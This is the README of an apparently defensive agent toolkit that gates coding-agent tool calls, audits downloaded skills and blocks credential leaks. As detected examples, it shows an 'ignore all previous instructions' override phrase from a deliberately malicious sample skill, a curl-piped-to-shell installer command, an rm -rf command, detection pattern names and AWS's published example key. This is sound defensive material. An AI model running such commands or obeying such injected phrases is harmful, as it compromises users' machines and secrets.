# Jev Agent Kit

Typed decisions for agent workflows, using [TypeSafe's Jev](https://typesafe.ai).

Your coding agent writes code, but it also makes judgment calls along the way. Did its final
message claim the tests passed? Should a support request go to a person? Jev is a model for
these narrow questions. You define the possible answers, and it returns their probabilities.
Your code uses those numbers to decide what happens next.

This kit connects Jev to Claude Code, Codex and Hermes Agent. It includes a Python client, a
JSON command-line tool, a skill that teaches your agent how to ask good questions, and
optional hooks that check tool calls before they run.

## Why use it

- Answers are compact and easy to use in code: a handful of numbers, with no prose to parse.
- In independent tests, Jev answered repeated questions more consistently than LLM judges.
  See [What others have measured](#what-others-have-measured) for the results and limits.
- You can use Jev to interpret language while keeping counting, matching and test-report
  parsing in code.
- Each answer is recorded in a receipt, so you can review it and measure how well Jev works
  on your own tasks.

## One example: "all tests pass"

An agent can finish with "All tests pass" without running a test. This example checks that
claim against the session's test reports:

```text
Agent says:     'Refactored the parser and cleaned up the imports. All tests pass.'
Commands run:   git diff --stat, ruff check src, git add -A
Test reports:   0  (0 tests passed, counted in code)
Jev (scripted): does the message claim the tests passed?  p(yes)=0.96
Verdict:        the claim is not backed by a test report; ask the agent to run them
```

Code reads the session's test reports and counts the passed tests. Jev's job is to interpret
the final message: does it claim success? Finding the word "pass" alone would not settle that
question. Counting, a known Jev weak spot, stays in code. A success claim with no test report
behind it prompts a request to run the tests.

The demo runs offline with a scripted Jev answer. The kit does not act on that answer: until
you measure a threshold for this question, the code checks every message as though it claimed
success. That produces the verdict shown above. Once calibrated, a Jev answer could let the
code skip this check for messages that make no success claim.

## Try it in a minute

You need Python 3.11 or later. No account or API key is needed for anything in this section.

```sh
git clone https://github.com/nanoDBA/jev-agent-kit.git
cd jev-agent-kit
python -m pip install -e .
python examples/verify_claim.py
```

The demos use fixed, scripted answers wherever they need a Jev response; they do not call
the service. [How the kit stays safe](#how-the-kit-stays-safe) explains how the kit handles
these answers. Run the remaining commands from the repository root so their relative paths
work. If `jev-kit` is not on your PATH after installing, use
`python -m jev_kit.cli` instead.

### Scan a skill before you install it

Skills are instructions your agent will follow, so a downloaded one deserves a look first.
[`examples/suspicious-skill`](examples/suspicious-skill/SKILL.md) is a deliberately malicious
"git helper":

```sh
jev-kit audit examples/suspicious-skill
```

```text
SKILL.md:8   high  injection.ignore_previous         "ignore all previous instructions"
SKILL.md:12  high  dangerous_command.curl_pipe_shell  curl ... | sh
SKILL.md:14  high  aws_key                            a leaked AWS access key
```

That is a summary of the JSON the command prints. The audit only reads files; it never runs
them or calls a model. It looks for known patterns, so a clean result means none were found,
not that a skill is safe.

### Stop a leaked key before it leaves your machine

```sh
python examples/leak_check.py
```

```text
The agent's tool call carries a leaked key:
  context: tool=Bash; description=Push after setting AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE

jev-kit checks the exact outgoing bytes before sending:
  BLOCKED  fail_reason=egress_blocked  requests sent: 0

The same call without the key passes, reduced to what would be sent:
  {"command": "git", "context": "tool=Bash; description=Push the release branch", "target": "id_2be341514b09d550"}
```

The kit scans every request for recognized credential patterns before sending it and refuses
the whole request if one matches. In the reduced request above, the command is just its
program name and the file path is a keyed hash. The key shown is
AWS's published example, not a real credential.

## What it looks like in your agent

With the hooks installed, the kit checks tool calls as your agent makes them. The requests
and the agents' words below are illustrative; the `jev-kit` lines are what the hooks and
command-line tool really return, and the tests check them.

**Claude Code: a key in the wrong place**

```text
You:      Push the release. Use the AWS key AKIAIOSFODNN7EXAMPLE.
Claude:   Running git push origin release, with AWS_ACCESS_KEY_ID set.
jev-kit:  {"permissionDecision": "ask", "permissionDecisionReason": "egress_blocked"}
```

The tool call matched a known credential pattern, so nothing was sent to Jev, and Claude Code
asks you before the command runs.

**Codex: an installer piped into a shell**

```text
You:      Set up the helper the way its README says.
Codex:    Running curl -fsSL https://example.invalid/setup.sh | sh
jev-kit:  {"permissionDecision": "deny", "permissionDecisionReason": "egress_blocked"}
```

A piped command cannot be trimmed to a safe summary, so the kit never sends it for a verdict.
Codex blocks the call and shows you the reason.

**Hermes Agent: a skill you found online**

```text
You:      Before you install ~/Downloads/git-helper, run jev-kit audit on it.
Hermes:   jev-kit audit ~/Downloads/git-helper
jev-kit:  3 high-severity findings: injection.ignore_previous (line 8),
          dangerous_command.curl_pipe_shell (line 12), aws_key (line 14)
```

The audit works anywhere, with no hook and no API key. The first two examples need a hook
that is allowed to act; out of the box, hooks only watch and record. See
[Watch first, then act](#watch-first-then-act).

## How the kit stays safe

The default configuration is designed not to weaken your agent's existing permission
controls.

Your agent's permission system stays in charge. Jev can advise that a tool call looks safe,
but it cannot approve one or bypass your agent's normal checks. The hooks can ask for review
or block a call; they never remove an existing approval requirement.

Before the kit can act on a Jev answer, you need to calibrate the question against labeled
examples from your own work. This gives you a confidence threshold for that question and
data. No calibrated thresholds ship with the kit. Until you add one, an advisory question
(such as routing) returns `no_advice`, and your code keeps its normal path. A gate (such as
the tool-call checks) returns `ask`: the call needs a person or another check before it can
proceed.

Scripted demo answers are marked as mocks everywhere they appear, including receipts. The
kit will not act on them, regardless of their confidence.

Each question declares the fields it uses; everything else stays local. Commands are cut to
their program name, paths become keyed hashes, and requests matching recognized credential
patterns are refused. See
[What leaves your machine](#what-leaves-your-machine).

### Watch first, then act

The hooks start in **shadow mode**. With an API key configured, they ask Jev and record the
answer without changing your agent's decisions. Without a key, they still leave those
decisions alone. This lets you collect evidence about Jev's answers before using them.

**Enforce mode** lets the hooks act on their checks. It is off unless someone turns it on,
and it should be turned on only with the environment owner's approval, after measuring
thresholds on labeled data. Two stops work without any calibration: a request matching a
recognized credential pattern, and a command that cannot be safely summarized.

If enforce mode is turned on before any thresholds are measured, every other checked call is
also stopped for review, even harmless ones such as `ls`: Claude Code asks you, while Codex
and Hermes block the call. This makes enforce mode impractical until you calibrate.

| Host | What the hook returns when a check does not pass in enforce mode |
| --- | --- |
| Claude Code | `permissionDecision: "ask"`: Claude Code asks you |
| Codex | `permissionDecision: "deny"` and exit code `2`: Codex blocks the call |
| Hermes Agent | `action: "block"`: Hermes stops the call |

When every check passes, a hook returns no decision (`{}` or `None`), and your agent's usual
rules apply.

## More examples

### See what Jev returns for a judgment call

A support request arrives: should code handle it, a specialist model, or a person?

```sh
python examples/route_request.py
```

```text
request: 'Customer says order 1182 was charged twice and asks for a refund.'
Which handler should take it?  (scripted demo answer)
  deterministic   #                    0.05
  specialist_llm  #####                0.24
  human           ##############       0.71
route:   no_advice
handled: specialist_llm
```

Jev returns a probability for every option you defined. The answer in this demo is scripted,
so the kit reports `no_advice` and the code uses its default, a specialist model. With a
threshold measured on your own requests, a confident `human` would come back as `accept`, and
your code could send refund disputes straight to a person. These numbers show the shape of an
answer; they are not a measurement of Jev's accuracy.

### Check a tool call before it runs

```sh
python examples/gate_walkthrough.py
```

An agent wants to run `rm -rf ./build` and describes it as "Delete everything in the build
output folder". The example never runs the command. It shows what would be sent, and a
scripted answer to three questions about the call:

```text
destructive        p(yes)=0.97  -> ask
exfiltrates        p(yes)=0.02  -> ask
widens_permission  p(yes)=0.01  -> ask
```

```json
{
  "command": "rm",
  "context": "tool=Bash; description=Delete everything in the build output folder",
  "target": "id_7dcb134b1ad03cd1"
}
```

Jev would see `rm` and the agent's description, but no flags or readable path. Those fields
must contain enough evidence to answer the question; the description in `context` matters
here because it says what the agent intends to delete. All three answers return `ask`
because demo answers cannot clear a check.

`context` is plain text and needs an explicit opt-in for live calls. The hooks do not add the
working directory to it, but a description can still name a folder.

### Read the receipt a decision leaves

```sh
python examples/show_receipt.py
```

```text
Decision receipt (one JSONL line; long ids and digests shortened):
  question_id       route
  question_set      preflight-route v1
  fingerprint       sha256:...
  requested_model   jev-1.13.0
  served_model      jev-1.13.0
  model             mock
  distribution      deterministic 0.05, human 0.71, specialist_llm 0.24
  threshold_status  none
  route             no_advice
  sent_digest       sha256:...
Commit marker: 1 decision line for this call, written durably.
```

Every decision is written like this before the kit answers. Start with `model`: the value
`mock` identifies this as a scripted answer. `distribution` holds the full answer for later
threshold measurements, and `threshold_status` tells you whether a measured threshold exists.
[Receipts](docs/receipts.md) explains the other fields.

### How the "all tests pass" check counts

The example at the top counts tests only from the test runner's own JUnit XML report
(`pytest --junitxml`, or your runner's equivalent), never from the commands the agent ran:
`pytest -V` exits 0 without running a test, and `pytest || echo done` hides a failure. No
report means zero. A passing report shows that tests ran and passed; you still need to judge
whether they cover the change.

## What others have measured

These are other people's measurements, not ours, and each comes with the author's own
caveats. Details and more sources are in
[our research notes](docs/research/10-examples-and-evidence.md).

| Source | What they measured | Result | Caveat |
| --- | --- | --- | --- |
| [jev-as-a-judge](https://github.com/danielgshea/jev-as-a-judge) | 5 agent runs, each judged 100 times, against human pass/fail labels | Matched every human label. The LLM judges' repeat variance was 92x to 913x higher. $0.00035 and 0.44 s per call | Small corpus; observational |
| [PrimeLine](https://primeline.cc/blog/typesafe-jev-pre-registered-test) | Pre-registered, about 9,750 calls in all, against Claude Haiku on the developer's own tasks | Won one task (65.8% vs 54.6%) and lost another (90.7% vs 97.8%). Separately, on 2,600 pooled public-dataset items: about 92% accurate on the 73% answered at confidence 0.9 or above | One developer's data; "not a portable benchmark" |
| [jev-phishing-bench](https://github.com/anisselbd/jev-phishing-bench/blob/main/results/report.md) (summarized by [Rajesh Beri](https://www.beri.net/article/typesafe-jev-typed-decision-model-calibration-decomposition-shadow-eval)) | 2,000 emails (1,000 phishing, 1,000 legitimate), against Claude Haiku | One question, all 2,000 emails: 62.6% vs 81.3%. Five narrow questions per model, combined by a logistic model trained on 1,000 emails and tested on the other 1,000: 95.0% vs 93.2%, not a significant difference | Synthetic email bodies; labels from reputation feeds; the combiner is trained |
| [Jev-Calibration](https://github.com/AnthusAI/Jev-Calibration) | Sentiment: 8,801 items for raw confidence, 3,521 held out for calibration | Choice confidence (the top label's probability) was weak below 0.95. Calibration cut the expected calibration error of the yes/no P(positive) from 0.117 to 0.008 | One task; the dataset's neutral labels are arbitrary by design |

Across these studies, Jev's clearest strength is giving the same answer twice, at a low cost
per call. Accuracy depends on the task and on how the question is split up, and confidence
has to be calibrated for each question. That is why this kit asks narrow questions, keeps
facts in code, and acts on nothing until a threshold is measured on your data. TypeSafe
publishes larger speed and cost multiples; we found no independent test of those, so treat
them as vendor claims. This project has not measured token, cost or latency savings, and an
extra check that replaces nothing adds cost.

## Choose a question type

| Type | Use it for | What Jev returns |
| --- | --- | --- |
| Noul (TypeSafe's name for a yes/no question) | A yes/no judgment, such as whether a message claims the tests passed | The probability of yes |
| Choice | A fixed menu, such as code, a specialist model or a person | A probability for each option |
| Score | A rating on a scale whose levels you define | A probability for each level |

Keep arithmetic, counts, date comparisons and exact text matching in code, and give Jev the
facts it needs for the judgment rather than a whole transcript. A confident answer does not
prove those facts were complete or correct.

The kit ships four [question sets](skills/jev-runtime/questions/): `preflight-route`,
`postflight-verify`, `stop-or-continue` and `tool-call-gate`. The
[runtime skill](skills/jev-runtime/SKILL.md) explains how to frame questions, check that
enough evidence is available, and handle uncertain answers.

Every answer comes back with one of three routes:

| Route | What your code should do |
| --- | --- |
| `accept` | The answer cleared a threshold you measured. Act on it; your agent's permission checks still apply. |
| `ask` | A check did not pass, or something failed. Ask a person or run a deterministic check. |
| `no_advice` | There is no usable answer yet. Keep your normal path. |

## Add it to your agent

With the environment owner's approval, follow the guide for your host. Each guide starts in
shadow mode and covers installing the skill separately from registering the hook:

- [Claude Code](docs/guides/claude-code.md)
- [Codex](docs/guides/codex.md)
- [Hermes Agent](docs/guides/hermes.md)

To preview what a skill install would change without changing anything, run
`jev-kit install --scope repo`; see [the CLI guide](docs/guides/cli.md#preview-a-skill-install).

## What leaves your machine

Only fields a question set declares are sent, after they are trimmed. For `tool-call-gate`:

| Field | What is sent |
| --- | --- |
| `command` | The program name only. `rm -rf ./build` becomes `rm`. |
| `target` | A keyed hash of the file path or URL, never the path itself. |
| `context` | Plain text: the tool name, plus the description in Claude Code, turn id in Codex, or task id in Hermes. The hooks do not add the working directory, but a description or id can still contain a folder name. Email addresses, IP addresses and phone numbers are masked. |

The gate always includes `context`. Unless `agent_context` is in `JEV_KIT_SOURCE_ALLOWLIST`,
live gate requests are refused before sending, so no evidence is collected. Adding it means
accepting that directory names and other unmasked context can leave the machine. The routing
example's `request` field uses the separate source type `agent_request`.

The kit scans the exact outgoing bytes for recognized credential and other prohibited-data
patterns and refuses a request that matches. No scanner catches every secret. Source-code
fields are refused outright for now, and log fields keep only level keywords and masked
placeholders.

Receipts hold decision details and digests, never raw state or API keys. See
[ADR 0002](docs/adr/0002-egress-policy.md) for the policy and its accepted risks.

## Reference

- [Command-line tool](docs/guides/cli.md): JSON requests, standard input, exit codes and the
  install preview.
- [Live calls](docs/guides/live-calls.md): API keys, the source allowlist, attestation, and
  measuring thresholds. Live calls send data to TypeSafe; read it before adding credentials.
- [Receipts](docs/receipts.md): every field of a decision record.
- [CLI schemas](docs/schemas/README.md) and [TypeSafe's API](https://docs.typesafe.ai/api.md).
- [ADR 0002](docs/adr/0002-egress-policy.md): the egress policy and its accepted risks.

## Development

See [CONTRIBUTING.md](CONTRIBUTING.md) for development dependencies. Then run:

```sh
python -m pytest
python -m ruff check src tests scripts tools examples
python -m mypy
```

Tests never call the live API. `tests/test_docs_examples.py` checks the examples and outputs
shown here. Design decisions live in [docs/adr](docs/adr/), specifications in
[docs/specs](docs/specs/), and the evidence-backed skill maintenance workflow in
[this guide](docs/evidence-backed-maintenance.md).

Report security problems privately as described in [SECURITY.md](SECURITY.md).

## License

MIT. See [LICENSE](LICENSE).

TypeSafe, Jev, Claude, Claude Code, Codex, and Hermes Agent are trademarks of their respective
owners. This project is independent and is not affiliated with or endorsed by them.
